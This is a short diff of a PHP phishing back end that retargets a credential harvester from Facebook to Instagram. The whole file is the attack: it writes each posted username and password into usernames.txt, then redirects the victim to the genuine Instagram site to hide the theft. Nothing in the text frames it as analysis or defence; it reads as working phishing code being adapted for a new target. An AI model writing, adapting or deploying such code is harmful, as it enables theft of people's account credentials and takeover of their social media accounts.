@@ -1,5 +1,5 @@
 <?php
 
-file_put_contents("usernames.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: https://facebook.com/');
+file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+header('Location: https://instagram.com');
 exit();
